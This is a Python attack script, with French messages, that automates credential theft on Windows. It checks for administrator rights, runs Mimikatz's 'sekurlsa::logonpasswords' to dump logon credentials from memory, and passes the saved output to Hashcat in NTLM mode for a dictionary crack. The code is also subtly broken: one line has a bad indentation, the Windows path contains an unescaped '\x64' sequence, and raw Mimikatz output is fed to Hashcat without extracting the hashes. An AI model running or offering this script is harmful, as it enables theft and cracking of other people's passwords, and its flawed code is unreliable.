import subprocess
import sys
import os

def check_admin():
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        is_admin = os.getuid() == 0
    if not is_admin:
        sys.exit("Ce script doit être exécuté avec des privilèges d'administrateur.")

def run_mimikatz(mimikatz_path):
    mimikatz_cmd = f"{mimikatz_path} \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
    try:
        output = subprocess.run(['cmd', '/c', mimikatz_cmd], capture_output=True, text=True)
        print(output.stdout)
        with open("mimikatz_output.txt", "w") as f:
            f.write(output.stdout)
    except Exception as e:
        print(f"Erreur lors de l'exécution de Mimikatz: {e}")

def run_hashcat(hashcat_path, hashes_file):
       hashcat_cmd = f"{hashcat_path} -m 1000 {hashes_file} -a 0 -o cracked_passwords.txt"
    try:
        subprocess.run(['cmd', '/c', hashcat_cmd], check=True)
        print("Hashcat a fini de craquer les mots de passe. Vérifiez 'cracked_passwords.txt' pour les résultats.")
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de l'exécution de Hashcat: {e}")

if __name__ == "__main__":
    check_admin()
    mimikatz_path = "C:\Tools\mimikatz\x64\mimikatz.exe"
    hashcat_path = "C:\Tools\hashcat\hashcat.exe"
    run_mimikatz(mimikatz_path)
    run_hashcat(hashcat_path, "mimikatz_output.txt")
